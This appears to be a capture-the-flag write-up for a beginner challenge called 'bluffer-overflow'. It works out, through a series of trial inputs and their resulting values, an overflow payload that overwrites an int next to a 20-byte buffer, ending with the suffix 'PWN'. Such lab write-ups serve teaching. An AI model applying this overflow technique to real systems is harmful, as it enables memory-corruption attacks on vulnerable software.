# bluffer-overflow

Maybe it's your first time pwning? Can you overwrite the variable?

## Solution

char buff[20];
int buff2;

else if (buff2 == 5134160)

AAAAAAAAAAAAAAAAAAAA5134160           (875770165)
AAAAAAAAAAAAAAAAAAAA005134160         (858862896)
AAAAAAAAAAAAAAAAAAAA000005134160      (808464432)
AAAAAAAAAAAAAAAAAAAA0000051341600     (808464432)

int -> 2147483647

AAAAAAAAAAAAAAAAAAAA-6  (13869)
AAAAAAAAAAAAAAAAAAAA-68 (3683885)
AAAAAAAAAAAAAAAAAAAA-99 (3750189)
AAAAAAAAAAAAAAAAAAAA0-99 (960048432)

XXXXXXXXXXXXXXXXXXXX2147483647      926167346
XXXXXXXXXXXXXXXXXXXX7463847412      859190327

XXXXXXXXXXXXXXXXXXXX0               48
XXXXXXXXXXXXXXXXXXXX1               49

XXXXXXXXXXXXXXXXXXXX10              12337
XXXXXXXXXXXXXXXXXXXX20              12338
XXXXXXXXXXXXXXXXXXXX30              12339

XXXXXXXXXXXXXXXXXXXX100             3158065
XXXXXXXXXXXXXXXXXXXX500             3158069
XXXXXXXXXXXXXXXXXXXX510             3158325
XXXXXXXXXXXXXXXXXXXX511             3223861
XXXXXXXXXXXXXXXXXXXX555             3487029
XXXXXXXXXXXXXXXXXXXX559             3749173
XXXXXXXXXXXXXXXXXXXX900             3158073
XXXXXXXXXXXXXXXXXXXX999             3750201
XXXXXXXXXXXXXXXXXXXX99A             4274489
XXXXXXXXXXXXXXXXXXXX99F             4602169
XXXXXXXXXXXXXXXXXXXX9FF             4605497
XXXXXXXXXXXXXXXXXXXX9FG             4671033
XXXXXXXXXXXXXXXXXXXX9FN             5129785

XXXXXXXXXXXXXXXXXXXX9NN             5131833
XXXXXXXXXXXXXXXXXXXX9PN             5132345
XXXXXXXXXXXXXXXXXXXX9UN             5133625
XXXXXXXXXXXXXXXXXXXX9VN             5133881
XXXXXXXXXXXXXXXXXXXX9WN             5134137
XXXXXXXXXXXXXXXXXXXXPWN

5134160

```sh
readelf -s a.out | grep buff
```